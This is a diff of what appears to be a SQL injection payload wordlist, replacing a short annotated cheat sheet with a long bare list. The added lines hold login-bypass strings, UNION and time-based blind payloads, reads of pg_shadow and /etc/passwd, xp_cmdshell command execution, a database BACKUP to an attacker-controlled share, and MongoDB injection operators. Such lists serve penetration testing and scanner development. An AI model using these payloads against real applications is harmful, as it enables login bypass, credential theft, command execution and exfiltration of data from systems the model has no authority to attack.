@@ -1,88 +1,325 @@
+'-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+"-"
+" "
+"&"
+"^"
+"*"
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+' or 'x'='x
+') or ('x')=('x
+')) or (('x'))=(('x
+" or "x"="x
+") or ("x")=("x
+")) or (("x"))=(("x
+' or 1=1-- -
+or 1=1
+or 1=1--
+or 1=1#
+or 1=1/*
+admin' --
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+admin') or ('1'='1
+admin') or ('1'='1'--
+admin') or ('1'='1'#
+admin') or ('1'='1'/*
+admin') or '1'='1
+admin') or '1'='1'--
+admin') or '1'='1'#
+admin') or '1'='1'/*
+' AND 1=0 
+UNION ALL SELECT 
+'admin';--
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+
+admin" --
+admin'#
+admin'--
+admin" #
+admin"/*
+admin" or "1"="1
+admin" or "1"="1"--
+admin" or "1"="1"#
+admin" or "1"="1"/*
+admin"or 1=1 or ""="
+admin" or 1=1
+admin" or 1=1--
+admin" or 1=1#
+admin" or 1=1/*
+admin") or ("1"="1
+admin") or ("1"="1"--
+admin") or ("1"="1"#
+admin") or ("1"="1"/*
+admin") or "1"="1
+admin") or "1"="1"--
+admin") or "1"="1"#
+admin") or "1"="1"/*
+1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+==
+=
 '
-''
-`
-``
-,
-"
-""
-/
-//
-\
-\\
-;
-' or "
--- or # 
-' OR '1
-' OR 1 -- -
-" OR "" = "
-" OR 1 = 1 -- -
-' OR '' = '
-'='
-'LIKE'
-'=0--+
- OR 1=1
-' OR 'x'='x
-' AND id IS NULL; --
-'''''''''''''UNION SELECT '2
-%00
-/*…*/ 
-+		addition, concatenate (or space in url)
-||		(double pipe) concatenate
-%		wildcard attribute indicator
-
-@variable	local variable
-@@variable	global variable
-
-
-# Numeric
-AND 1
-AND 0
-AND true
-AND false
-1-false
-1-true
-1*56
--2
-
-
-1' ORDER BY 1--+
-1' ORDER BY 2--+
-1' ORDER BY 3--+
-
-1' ORDER BY 1,2--+
-1' ORDER BY 1,2,3--+
-
-1' GROUP BY 1,2,--+
-1' GROUP BY 1,2,3--+
-' GROUP BY columnnames having 1=1 --
-
-
--1' UNION SELECT 1,2,3--+
-' UNION SELECT sum(columnname ) from tablename --
-
-
--1 UNION SELECT 1 INTO @,@
--1 UNION SELECT 1 INTO @,@,@
-
-1 AND (SELECT * FROM Users) = 1	
-
-' AND MID(VERSION(),1,1) = '5';
-
-' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
-
-
-Finding the table name
-
-
-Time-Based:
-,(select * from (select(sleep(10)))a)
-%2c(select%20*%20from%20(select(sleep(10)))a)
-';WAITFOR DELAY '0:0:30'--
-
-Comments:
-
-#	    Hash comment
-/*  	C-style comment
--- -	SQL comment
-;%00	Nullbyte
-`	    Backtick
+' --
+' #
+' –
+'--
+'/*
+'#
+" --
+" #
+"/*
+' and 1='1
+' and a='a
+or 1=1
+or true
+' or ''='
+" or ""="
+1′) and '1′='1–
+' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055
+" AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055
+and 1=1
+and 1=1–
+' and 'one'='one
+' and 'one'='one–
+' group by password having 1=1--
+' group by userid having 1=1--
+' group by username having 1=1--
+like '%'
+or 0=0 --
+or 0=0 #
+or 0=0 –
+' or         0=0 #
+' or 0=0 --
+' or 0=0 #
+' or 0=0 –
+" or 0=0 --
+" or 0=0 #
+" or 0=0 –
+%' or '0'='0
+or 1=1
+or 1=1--
+or 1=1/*
+or 1=1#
+or 1=1–
+' or 1=1--
+' or '1'='1
+' or '1'='1'--
+' or '1'='1'/*
+' or '1'='1'#
+' or '1′='1
+' or 1=1
+' or 1=1 --
+' or 1=1 –
+' or 1=1--
+' or 1=1;#
+' or 1=1/*
+' or 1=1#
+' or 1=1–
+') or '1'='1
+') or '1'='1--
+') or '1'='1'--
+') or '1'='1'/*
+') or '1'='1'#
+') or ('1'='1
+') or ('1'='1--
+') or ('1'='1'--
+') or ('1'='1'/*
+') or ('1'='1'#
+'or'1=1
+'or'1=1′
+' or 1=1-- -#
+' or 1=1-- --
+" or 1=1-- -
+" or 1=1-- --
+' or 1=1;-- -
+" or "1"="1
+" or "1"="1"--
+" or "1"="1"/*
+" or "1"="1"#
+" or 1=1
+" or 1=1 --
+" or 1=1 –
+" or 1=1--
+" or 1=1/*
+" or 1=1#
+" or 1=1–
+") or "1"="1
+") or "1"="1"--
+") or "1"="1"/*
+") or "1"="1"#
+") or ("1"="1
+") or ("1"="1"--
+") or ("1"="1"/*
+") or ("1"="1"#
+) or '1′='1–
+) or ('1′='1–
+' or 1=1 LIMIT 1;#
+'or 1=1 or ''='
+"or 1=1 or ""="
+' or 'a'='a
+' or a=a--
+' or a=a–
+') or ('a'='a
+" or "a"="a
+") or ("a"="a
+') or ('a'='a and hi") or ("a"="a
+' or 'one'='one
+' or 'one'='one–
+' or uid like '%
+' or uname like '%
+' or userid like '%
+' or user like '%
+' or username like '%
+' or 'x'='x
+') or ('x'='x
+" or "x"="x
+' OR 'x'='x'#;
+'=' 'or' and '=' 'or'
+' UNION ALL SELECT 1, @@version;#
+' UNION SELECT * FROM leve3_users;-- -
+' UNION ALL SELECT system_user(),user();#
+' UNION select table_schema,table_name FROM information_Schema.tables;#
+admin' and substring(password/text(),1,1)='7
+' and substring(password/text(),1,1)='7
+' or 1=1 limit 1 -- -+
+'="or'
+select version();	
+select current_database();
+select current_user;
+select session_user;
+select current_setting('log_connections');
+select current_setting('log_statement');
+select current_setting('port');
+select current_setting('password_encryption');
+select current_setting('krb_server_keyfile');
+select current_setting('virtual_host');
+select current_setting('port');
+select current_setting('config_file');
+select current_setting('hba_file');
+select current_setting('data_directory');
+select * from pg_shadow;
+select * from pg_group;
+create table myfile (input TEXT);
+copy myfile from '/etc/passwd'; 
+select * from myfile;copy myfile to /tmp/test;
+create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
+<username>' OR 1=1--
+'OR '' = '
+<username>'--
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
+'OR 1=1--
+create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
+<username>' OR 1=1--
+'OR '' = '
+<username>'--
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
+'OR 1=1--
+'OR '' = '
+select @@version
+select @@servernamee
+select @@microsoftversione
+select * from master..sysserverse
+select * from sysusers
+exec master..xp_cmdshell 'ipconfig+/all'	
+exec master..xp_cmdshell 'net+view'
+exec master..xp_cmdshell 'net+users'
+exec master..xp_cmdshell 'ping+<attackerip>'
+BACKUP database master to disks='\\<attackerip>\<attackerip>\backupdb.dat'
+create table myfile (line varchar(8000))" bulk insert foo from 'c:\inetpub\wwwroot\auth.asp�'" select * from myfile"--
+select versionnumber, version_timestamp from sysibm.sysversions;
+select user from sysibm.sysdummy1;
+select session_user from sysibm.sysdummy1;
+select system_user from sysibm.sysdummy1;
+select current server from sysibm.sysdummy1;
+select name from sysibm.systables;
+select grantee from syscat.dbauth;
+select * from syscat.tabauth;
+select * from syscat.dbauth where grantee = current user;
+select * from syscat.tabauth where grantee = current user;
+select name, tbname, coltype from sysibm.syscolumns;
+SELECT schemaname FROM syscat.schemata;
+true, $where: '1 == 1'
+, $where: '1 == 1'
+$where: '1 == 1'
+', $where: '1 == 1'
+1, $where: '1 == 1'
+{ $ne: 1 }
+', $or: [ {}, { 'a':'a
+' } ], $comment:'successful MongoDB injection'
+db.injection.insert({success:1});
+db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
+|| 1==1
+' && this.password.match(/.*/)//+%00
+' && this.passwordzz.match(/.*/)//+%00
+'%20%26%26%20this.password.match(/.*/)//+%00
+'%20%26%26%20this.passwordzz.match(/.*/)//+%00
+{$gt: ''}
+[$ne]=1
+';sleep(5000);
+';sleep(5000);'
+';sleep(5000);+'
+';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
+1
+1 and user_name() = 'dbo'
+\'; desc users; --
+1\'1
+1' and non_existant_table = '1
+' or username is not NULL or username = '
+1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116
+1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --
+1 uni/**/on select all from where
+1'1
+1 exec sp_ (or exec xp_)
+1 and 1=1
+1' and 1=(select count(*) from tablenames); --
+1 or 1=1
+1' or '1'='1
+1or1=1
+1'or'1'='1
+fake@ema'or'il.nl'='il.nl
+'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --
+'; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --
+'; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --
+'; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --
+'; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --
+'; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' -- 
+'; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --
+'; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --
+; --
+'; --
+'); --
+'; exec master..xp_cmdshell 'ping 10.10.1.2'--
+' grant connect to name; grant resource to name; --
+' or 1=1 -- 
+' union (select @@version) --
+' union (select NULL, (select @@version)) --
+' union (select NULL, NULL, (select @@version)) --
+' union (select NULL, NULL, NULL,  (select @@version)) --
+' union (select NULL, NULL, NULL, NULL,  (select @@version)) --
+' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --
